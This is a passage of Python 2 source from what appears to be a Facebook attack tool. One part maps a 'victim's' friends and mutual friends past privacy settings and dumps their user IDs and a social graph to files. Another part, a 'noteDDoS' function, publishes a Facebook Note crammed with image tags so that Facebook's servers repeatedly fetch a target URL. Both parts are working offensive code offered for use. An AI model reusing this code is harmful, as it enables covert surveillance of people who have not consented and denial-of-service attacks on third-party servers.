            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state will still be True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    logs('Check the internet connection please.. Press enter when it\'s done')
                    print '\r                                                                       \r',
                    a = raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r')
                    if a == 1:
                        state = False
                    else:
                        if a == 2:
                            email,password = setMail()
                            login(email,password,'real')
            
            #Stores non repetitive values in the disclosed friends container
            friendName = getName(friends)    
            for element in result:
                if element not in friendships:
                    transitive = getName(element)
                    myGraph.write('    "'+friendName + '" -> "' + transitive + '";\n')
                    friendships.append(element)
            
            #Stores every single value of friendships list already analysed for non repetitiveness
            visited.append(friends)
            
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"ab")
    except:
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
        
    #Stores every userID for further analysis
    for friends in friendships:
        transitivo = getName(friends)
        myGraph.write('    "'+victim + '" -> "' + transitivo + '";\n')
        friendshipFile.write(str(friends)+'\n')
    
    myGraph.write('}')
    friendshipFile.close()
    myGraph.close()

def simpleDotGraph(friends, victim):
    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = open(root+'\\'+directory+'\\'+victim+'_dot.dot',"wb")
    myGraph.write('Graph    {\n')
    
  
    friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
    for friend in friends:
        friendshipFile.write(str(friend)+'\n')
    friendshipFile.close()
    
    
    for friend in friends:
        try:
            mutual = coreFriendshipPrivacy(victim, friend)
        except:
            continue
        
              
        transitive = getName(friend)
            
        myGraph.write('    "'+victim + '" -> "' + transitive + '";\n')
        
        for element in mutual:

            mutualFriend = getName(element)
                
            myGraph.write('    "'+transitive + '" -> "' + mutualFriend + '";\n')

    myGraph.write('}')    
    myGraph.close()
    
def noteDDoS(imageURL,noteID, privacy):
    set_dtsg()   
    j = int(raw_input('starting parameter number? (img.jpg?file=number) : '))
    amount = int(raw_input('last parameter number? (img.jpg?file=number) : '))
    title = raw_input('Note title: ')
    content = '<p>' + raw_input('Note preview text: ') + '</p>' 
    for i in range(j,int(amount)):
        content += '<p><img src="'+imageURL+'?file='+str(i)+'"></img></p>'
        
    arguments = {
        'fb_dtsg' : br.form['fb_dtsg'],
        'object_id' : noteID,
        'note_id' : noteID,
        'id' : getC_user(),
        'title' : title,
        'note_content' : content,
        'audience['+noteID+'][value]' : privacy,
        'publish' : 'Publish',
        '__user' : getC_user(),
        '__a' : '1',
        '__dyn' : '7n8ahyj34fzpQ9UoHaEWy1m9ACwKyaF3pqzCAjFDxCm6qyE',
        '__req' : '7',
        'ttstamp' : '2658169897154120115496511690',
        '__rev' : '1224624'
        }
    
    datos = urlencode(arguments)
    try:
        response = br.open('https://www.facebook.com/ajax/notes/edit',datos)
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in the DDoS module')
        print '\rError in the DDoS module\r'
        raise 
